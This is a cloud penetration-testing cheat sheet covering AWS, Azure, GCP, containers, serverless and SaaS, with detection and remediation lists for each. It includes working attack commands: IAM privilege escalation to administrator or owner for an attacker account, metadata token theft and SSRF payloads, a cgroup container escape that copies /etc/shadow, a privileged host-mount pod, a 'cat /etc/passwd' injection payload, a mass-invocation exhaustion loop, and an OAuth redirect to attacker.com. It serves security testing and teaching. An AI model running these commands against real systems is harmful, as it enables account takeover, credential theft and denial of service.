# Cloud Security Attacks Reference

## Overview
Cloud security testing focuses on identifying misconfigurations, weak access controls, and vulnerabilities in cloud infrastructure, services, and applications.

**MITRE ATT&CK**: T1580 (Cloud Infrastructure Discovery), T1078.004 (Cloud Accounts), T1537 (Transfer Data to Cloud Account)

---

## AWS Security Testing

### Description
Testing Amazon Web Services environments for security weaknesses, misconfigurations, and excessive permissions.

### Common Vulnerabilities
- **Public S3 Buckets**: Exposed data
- **IAM Misconfigurations**: Excessive permissions
- **Security Group Issues**: Overly permissive rules
- **Exposed Credentials**: Hardcoded keys
- **Snapshot/AMI Exposure**: Public snapshots
- **Lambda Function Abuse**: Privilege escalation

### Tools
- ScoutSuite (multi-cloud auditing)
- Prowler (AWS security assessment)
- CloudMapper (AWS visualization)
- Pacu (AWS exploitation framework)
- aws-cli (official CLI)
- cloudsplaining (IAM assessment)
- S3Scanner (S3 bucket enumeration)

### Testing Methodology
1. Enumerate AWS resources
2. Review IAM policies and permissions
3. Check S3 bucket permissions
4. Audit security groups
5. Review CloudTrail logs
6. Test for privilege escalation
7. Check for exposed credentials
8. Enumerate public resources

### AWS CLI Enumeration
```bash
# Configure AWS CLI
aws configure

# Identity information
aws sts get-caller-identity

# List S3 buckets
aws s3 ls

# Check bucket permissions
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# List EC2 instances
aws ec2 describe-instances

# List IAM users
aws iam list-users

# Get user policies
aws iam list-user-policies --user-name username
aws iam list-attached-user-policies --user-name username

# List security groups
aws ec2 describe-security-groups

# List Lambda functions
aws lambda list-functions

# List RDS instances
aws rds describe-db-instances

# Enumerate exposed snapshots
aws ec2 describe-snapshots --owner-ids self

# Check for public snapshots
aws ec2 describe-snapshots --filters "Name=volume-size,Values=*" --query 'Snapshots[?Public==`true`]'
```

### Prowler Security Assessment
```bash
# Install Prowler
git clone https://github.com/prowler-cloud/prowler
cd prowler

# Run full assessment
./prowler -M text html json

# Check specific services
./prowler -s s3
./prowler -s iam

# Check specific region
./prowler -r us-east-1

# Output formats
./prowler -M html  # HTML report
./prowler -M json  # JSON output
```

### ScoutSuite
```bash
# Install ScoutSuite
pip install scoutSuite

# Run AWS audit
scout aws --profile default

# Run with specific services
scout aws --services s3,iam,ec2

# View report
python -m http.server 8000
# Open report.html
```

### S3 Bucket Testing
```bash
# S3Scanner
python3 s3scanner.py bucketname

# Test public access
aws s3 ls s3://bucket-name --no-sign-request

# Download from public bucket
aws s3 cp s3://bucket-name/file.txt . --no-sign-request

# Check for directory listing
curl http://bucket-name.s3.amazonaws.com/

# Test write access
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request
```

### IAM Privilege Escalation
```bash
# List IAM permissions
aws iam list-attached-user-policies --user-name user
aws iam get-policy-version --policy-arn arn --version-id v1

# Common privilege escalation paths:
# 1. CreateAccessKey on another user
aws iam create-access-key --user-name admin

# 2. AttachUserPolicy
aws iam attach-user-policy --user-name self --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. PutUserPolicy
aws iam put-user-policy --user-name self --policy-name escalate --policy-document file://admin-policy.json

# 4. CreatePolicyVersion
aws iam create-policy-version --policy-arn arn --policy-document file://admin.json --set-as-default

# 5. Lambda function with privileged role
aws lambda update-function-code --function-name func --zip-file fileb://payload.zip
```

### Pacu (AWS Exploitation Framework)
```bash
# Install Pacu
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip3 install -r requirements.txt

# Run Pacu
python3 pacu.py

# Import AWS keys
import_keys --profile default

# Enumerate permissions
run iam__enum_permissions

# Enumerate users and roles
run iam__enum_users_roles_policies_groups

# Detect vulnerable Lambda functions
run lambda__enum

# Privilege escalation
run iam__privesc_scan
```

### Detection Methods
- CloudTrail monitoring
- AWS GuardDuty alerts
- Config Rules compliance
- Unusual API activity
- Geographic anomalies
- Access Analyzer findings

### Remediation
- Enable CloudTrail logging
- Implement least privilege IAM
- Use IAM roles instead of access keys
- Enable MFA for all users
- Regular access reviews
- Encrypt S3 buckets
- Use SCPs (Service Control Policies)
- Enable GuardDuty
- Implement AWS Config rules
- Use AWS Security Hub

### References
- **MITRE ATT&CK**: T1580, T1078.004, T1552.001
- **CWE**: CWE-732 (Incorrect Permission Assignment)
- **AWS**: Security Best Practices
- **Tools**: https://github.com/RhinoSecurityLabs/pacu

---

## Azure Security Testing

### Description
Testing Microsoft Azure environments for security issues and misconfigurations.

### Common Vulnerabilities
- **Public Storage Accounts**: Exposed blobs
- **Excessive RBAC Permissions**: Over-privileged accounts
- **Network Security Group Issues**: Open rules
- **Managed Identity Abuse**: Service principal compromise
- **Key Vault Misconfigurations**: Exposed secrets
- **Public Virtual Machines**: Exposed VMs

### Tools
- ScoutSuite (multi-cloud)
- Azure CLI (az)
- PowerShell Az module
- ROADtools (Azure AD assessment)
- Stormspotter (Azure visualization)
- MicroBurst (Azure security assessment)
- Azucar (Azure security auditing)

### Testing Methodology
1. Enumerate Azure resources
2. Review RBAC assignments
3. Check storage account permissions
4. Audit network security groups
5. Review Key Vault access policies
6. Test for privilege escalation
7. Enumerate managed identities
8. Check for exposed VMs

### Azure CLI Enumeration
```bash
# Login to Azure
az login

# Get account information
az account show

# List subscriptions
az account list

# List resource groups
az group list

# List storage accounts
az storage account list

# Check storage account access
az storage account show --name accountname

# List public containers
az storage container list --account-name accountname

# List virtual machines
az vm list

# List network security groups
az network nsg list

# Show NSG rules
az network nsg rule list --nsg-name nsg-name --resource-group rg-name

# List Key Vaults
az keyvault list

# List secrets in Key Vault
az keyvault secret list --vault-name vault-name

# Get secret value
az keyvault secret show --vault-name vault-name --name secret-name

# List role assignments
az role assignment list

# Check user permissions
az role assignment list --assignee user@domain.com
```

### PowerShell Azure Enumeration
```powershell
# Connect to Azure
Connect-AzAccount

# Get current context
Get-AzContext

# List subscriptions
Get-AzSubscription

# List resource groups
Get-AzResourceGroup

# List storage accounts
Get-AzStorageAccount

# List VMs
Get-AzVM

# List NSGs
Get-AzNetworkSecurityGroup

# Get NSG rules
Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg

# List Key Vaults
Get-AzKeyVault

# List role assignments
Get-AzRoleAssignment

# Check managed identities
Get-AzUserAssignedIdentity
```

### Storage Account Testing
```bash
# Test anonymous access
az storage blob list --account-name accountname --container-name containername --auth-mode login

# Without authentication
curl https://accountname.blob.core.windows.net/container/

# Download blob
az storage blob download --account-name accountname --container-name container --name file.txt --file ./file.txt

# List containers anonymously
curl https://accountname.blob.core.windows.net/?comp=list
```

### ROADtools (Azure AD)
```bash
# Install ROADtools
pip install roadrecon

# Authenticate
roadrecon auth --username user@domain.com --password pass

# Gather data
roadrecon gather

# Start GUI
roadrecon gui
```

### MicroBurst
```powershell
# Import MicroBurst
Import-Module MicroBurst.psm1

# Enumerate Azure resources
Get-AzureDomainInfo -domain target.onmicrosoft.com

# Find public storage containers
Invoke-EnumerateAzureBlobs -Base target

# Get RunAs accounts
Get-AzureRunAsAccounts

# Get available VM extensions
Get-AzureVMExtensionSettings
```

### Privilege Escalation Paths
```bash
# Contributor role on subscription
# Can create new resources, including VMs with scripts

# Owner role on resource
# Can modify RBAC permissions

# User Access Administrator
# Can grant permissions to self or others

# Global Administrator (Azure AD)
# Can elevate to subscription Owner

# Application Administrator
# Can reset credentials for service principals
```

### Detection Methods
- Azure Monitor alerts
- Azure Security Center
- Activity log monitoring
- Conditional Access policies
- Sentinel (SIEM)
- Unusual authentication patterns

### Remediation
- Implement least privilege RBAC
- Enable Azure Security Center
- Use Managed Identities
- Implement Conditional Access
- Enable MFA for all users
- Regular access reviews
- Encrypt storage accounts
- Use private endpoints
- Implement Azure Policy
- Enable Azure Sentinel

### References
- **MITRE ATT&CK**: T1078.004, T1580
- **CWE**: CWE-284 (Improper Access Control)
- **Microsoft**: Azure Security Best Practices
- **Tools**: https://github.com/dirkjanm/ROADtools

---

## Google Cloud Platform (GCP) Security

### Description
Testing Google Cloud Platform for security vulnerabilities and misconfigurations.

### Common Vulnerabilities
- **Public Storage Buckets**: Exposed GCS objects
- **IAM Misconfigurations**: Over-permissive roles
- **Firewall Rules**: Open ingress rules
- **Service Account Key Exposure**: Leaked credentials
- **Compute Instance Metadata**: SSRF vulnerabilities
- **Public Compute Instances**: Exposed VMs

### Tools
- ScoutSuite
- gcloud CLI
- GCPBucketBrute
- CloudMapper
- Forseti Security
- IAM Privilege Escalation Scanner

### Testing Methodology
1. Enumerate GCP resources
2. Review IAM policies
3. Check GCS bucket permissions
4. Audit firewall rules
5. Test compute instance metadata
6. Check for privilege escalation
7. Review service account permissions
8. Enumerate public resources

### gcloud CLI Enumeration
```bash
# Authenticate
gcloud auth login

# List projects
gcloud projects list

# Set active project
gcloud config set project project-id

# Get current configuration
gcloud config list

# List compute instances
gcloud compute instances list

# List storage buckets
gsutil ls

# Check bucket permissions
gsutil iam get gs://bucket-name

# List bucket contents
gsutil ls gs://bucket-name

# List firewall rules
gcloud compute firewall-rules list

# Show firewall rule details
gcloud compute firewall-rules describe rule-name

# List IAM policies
gcloud projects get-iam-policy project-id

# List service accounts
gcloud iam service-accounts list

# List service account keys
gcloud iam service-accounts keys list --iam-account=sa@project.iam.gserviceaccount.com
```

### GCS Bucket Testing
```bash
# Test anonymous access
gsutil ls gs://bucket-name/

# Download from public bucket
gsutil cp gs://bucket-name/file.txt .

# Test write access
gsutil cp test.txt gs://bucket-name/test.txt

# Make object public (if permissions allow)
gsutil acl ch -u AllUsers:R gs://bucket-name/file.txt

# Enumerate buckets
for name in company-backups company-data company-files; do
  gsutil ls gs://$name 2>&1
done
```

### Compute Instance Metadata
```bash
# Access metadata (from compromised instance)
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true" \
  -H "Metadata-Flavor: Google"

# Get service account token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Get service account email
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google"

# Use in SSRF attacks
# If application makes HTTP requests based on user input:
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### IAM Privilege Escalation
```bash
# Common escalation paths:

# 1. iam.serviceAccounts.actAs
gcloud iam service-accounts keys create key.json \
  --iam-account=privileged-sa@project.iam.gserviceaccount.com

# 2. iam.serviceAccountKeys.create
gcloud iam service-accounts keys create newkey.json \
  --iam-account=target-sa@project.iam.gserviceaccount.com

# 3. compute.instances.setMetadata (add SSH keys)
gcloud compute instances add-metadata instance-name \
  --metadata-from-file ssh-keys=keys.txt

# 4. cloudfunctions.functions.setIamPolicy
gcloud functions add-iam-policy-binding function-name \
  --member=user:attacker@gmail.com \
  --role=roles/cloudfunctions.invoker

# 5. resourcemanager.projects.setIamPolicy
gcloud projects add-iam-policy-binding project-id \
  --member=user:attacker@gmail.com \
  --role=roles/owner
```

### ScoutSuite for GCP
```bash
# Run GCP audit
scout gcp --user-account

# Or with service account
scout gcp --service-account key.json

# View report
# Open scoutsuite-report/scoutsuite_results_gcp.html
```

### Detection Methods
- Cloud Audit Logs
- Security Command Center
- Anomaly detection
- Firewall logs
- VPC Flow Logs
- Access Transparency logs

### Remediation
- Implement least privilege IAM
- Use organization policies
- Enable VPC Service Controls
- Implement private Google access
- Rotate service account keys
- Enable Cloud Armor
- Use Binary Authorization
- Implement Security Command Center
- Regular IAM audits
- Enable audit logging

### References
- **MITRE ATT&CK**: T1078.004, T1552.001
- **CWE**: CWE-732
- **Google**: GCP Security Best Practices
- **SSRF**: Metadata service exploitation

---

## Container Security (Docker/Kubernetes)

### Description
Testing containerized applications and orchestration platforms for security vulnerabilities.

### Docker Vulnerabilities
- **Privileged Containers**: Running with --privileged
- **Docker Socket Exposure**: Mounting /var/run/docker.sock
- **Vulnerable Images**: Outdated base images
- **Secrets in Images**: Hardcoded credentials
- **Host Namespace Sharing**: --pid=host, --net=host
- **Insecure Registries**: Unencrypted/unauthenticated

### Kubernetes Vulnerabilities
- **Anonymous Access**: Unauthenticated API access
- **RBAC Misconfigurations**: Excessive permissions
- **Exposed Dashboard**: Public Kubernetes dashboard
- **Privileged Pods**: securityContext.privileged
- **HostPath Mounts**: Mounting host filesystem
- **Secrets Management**: Unencrypted secrets

### Tools
- kube-hunter (Kubernetes penetration testing)
- kubectl (Kubernetes CLI)
- kube-bench (CIS benchmark)
- docker (Docker CLI)
- Trivy (vulnerability scanner)
- Anchore (container analysis)
- kubeaudit
- kubeletctl

### Testing Methodology
1. Enumerate exposed services
2. Test authentication mechanisms
3. Review RBAC permissions
4. Scan container images
5. Test for container escape
6. Check for exposed secrets
7. Audit network policies
8. Test privilege escalation

### Docker Security Testing
```bash
# Check Docker version
docker version

# List containers
docker ps

# Inspect container
docker inspect container_id

# Check for privileged containers
docker inspect container_id | grep -i privileged

# Check capabilities
docker inspect container_id | grep -i cap

# Check mounted volumes
docker inspect container_id | grep -A 10 Mounts

# Scan image for vulnerabilities
trivy image imagename:tag

# Check for secrets in image
docker history imagename:tag --no-trunc
docker inspect imagename:tag

# Test Docker socket exposure (from inside container)
ls -la /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Escape from privileged container
docker run --rm --privileged -it ubuntu bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
```

### Kubernetes Enumeration
```bash
# Check cluster info
kubectl cluster-info

# List namespaces
kubectl get namespaces

# List pods
kubectl get pods --all-namespaces

# List services
kubectl get services --all-namespaces

# Check RBAC permissions
kubectl auth can-i --list

# Check current permissions
kubectl auth can-i create pods
kubectl auth can-i '*' '*'

# Get service account token (from pod)
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# List secrets
kubectl get secrets --all-namespaces

# Decode secret
kubectl get secret secret-name -o jsonpath='{.data.password}' | base64 -d

# Check for privileged pods
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.securityContext.privileged==true)'
```

### kube-hunter
```bash
# Install kube-hunter
pip install kube-hunter

# Run active scan (from outside)
kube-hunter --remote cluster-ip

# Run from within cluster
kube-hunter --pod

# Run specific tests
kube-hunter --active
```

### kube-bench (CIS Benchmark)
```bash
# Run kube-bench
docker run --pid=host --privileged -v /etc:/etc:ro -v /var:/var:ro \
  aquasec/kube-bench:latest run --targets master,node

# Or install and run
kube-bench run --targets master,node
```

### Kubernetes API Testing
```bash
# Test anonymous access
curl -k https://kubernetes-api:6443/api/v1/namespaces

# With token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces

# Create privileged pod (if permissions allow)
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attack-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: attack
    image: ubuntu
    command: ["/bin/bash", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
```

### Container Escape Techniques
```bash
# Privileged container escape
# Mount host filesystem via cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > /tmp/shadow' >> /cmd
chmod +x /cmd

# Docker socket escape
docker run -v /:/host -it ubuntu chroot /host

# HostPath mount exploitation
kubectl exec -it pod-name -- /bin/bash
cd /host-mount
# Access host filesystem
```

### Detection Methods
- Runtime security monitoring
- Audit logs (Kubernetes)
- Network policies
- Pod Security Policies/Standards
- Admission controllers
- Container image scanning
- Behavioral analysis

### Remediation
- Never use --privileged unless absolutely necessary
- Implement Pod Security Standards
- Use network policies
- Enable RBAC
- Scan images for vulnerabilities
- Use minimal base images
- Implement admission controllers
- Enable audit logging
- Use secrets management (Vault, Sealed Secrets)
- Regular security scanning
- Implement runtime security (Falco)

### References
- **MITRE ATT&CK**: T1611 (Escape to Host)
- **CWE**: CWE-250
- **Kubernetes**: Security Best Practices
- **Docker**: Security Documentation
- **CIS**: Docker and Kubernetes Benchmarks

---

## Serverless Security

### Description
Testing serverless functions (AWS Lambda, Azure Functions, Google Cloud Functions) for security issues.

### Common Vulnerabilities
- **Function Injection**: Code injection in functions
- **Excessive Permissions**: Over-privileged IAM roles
- **Secrets Exposure**: Hardcoded credentials
- **Event Injection**: Malicious event data
- **Dependency Vulnerabilities**: Outdated packages
- **Resource Exhaustion**: DoS via function invocations

### AWS Lambda Testing
```bash
# List functions
aws lambda list-functions

# Get function details
aws lambda get-function --function-name function-name

# Get function configuration
aws lambda get-function-configuration --function-name function-name

# Invoke function
aws lambda invoke --function-name function-name --payload '{"key":"value"}' output.txt

# Get function policy
aws lambda get-policy --function-name function-name

# Check environment variables (may contain secrets)
aws lambda get-function-configuration --function-name name | jq .Environment

# Download function code
aws lambda get-function --function-name name --query 'Code.Location' --output text
# Download from the URL returned
```

### Testing for Vulnerabilities
```bash
# Injection testing
# Invoke with malicious payloads
aws lambda invoke --function-name function-name \
  --payload '{"command": "cat /etc/passwd"}' output.txt

# SSRF testing
aws lambda invoke --function-name function-name \
  --payload '{"url": "http://169.254.169.254/latest/meta-data/"}' output.txt

# Resource exhaustion
for i in {1..1000}; do
  aws lambda invoke --function-name function-name output-$i.txt &
done
```

### Detection Methods
- CloudWatch Logs
- CloudTrail (invocation logging)
- X-Ray tracing
- Unusual invocation patterns
- Error rate monitoring
- Performance metrics

### Remediation
- Implement least privilege
- Input validation
- Secrets management (Parameter Store, Secrets Manager)
- Dependency scanning
- Rate limiting
- Function timeout configuration
- VPC integration for network isolation
- Code signing
- Environment variable encryption

### References
- **MITRE ATT&CK**: T1578 (Modify Cloud Compute Infrastructure)
- **CWE**: CWE-94 (Code Injection)
- **OWASP**: Serverless Top 10
- **Tools**: Serverless Security Toolkit

---

## SaaS Security Testing

### Description
Testing Software-as-a-Service applications for security issues.

### Common Issues
- **OAuth Misconfigurations**: Improper OAuth implementation
- **API Security**: Weak API authentication/authorization
- **Data Exposure**: Publicly accessible data
- **Subdomain Takeovers**: Abandoned DNS entries
- **Third-party Integrations**: Insecure integrations

### Testing Methodology
1. Enumerate subdomains and services
2. Test OAuth flows
3. API security testing
4. Check for subdomain takeovers
5. Review third-party integrations
6. Test data access controls
7. Check for information disclosure

### Subdomain Enumeration
```bash
# subfinder
subfinder -d target.com -o subdomains.txt

# amass
amass enum -d target.com

# Check for takeover possibilities
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
```

### OAuth Testing
```bash
# Test redirect_uri manipulation
# Original: ?redirect_uri=https://app.example.com/callback
# Test: ?redirect_uri=https://attacker.com/callback

# Test state parameter
# Missing state = CSRF vulnerability

# Test scope escalation
# Request: scope=read
# Try: scope=read write admin
```

### Detection Methods
- API gateway monitoring
- OAuth audit logs
- Behavioral analytics
- Data access monitoring

### Remediation
- Implement proper OAuth validation
- Use API gateways
- Regular subdomain audits
- Monitor third-party integrations
- Implement data loss prevention
- Regular security assessments

### References
- **MITRE ATT&CK**: T1199 (Trusted Relationship)
- **OWASP**: API Security Top 10
- **OAuth**: Security Best Practices
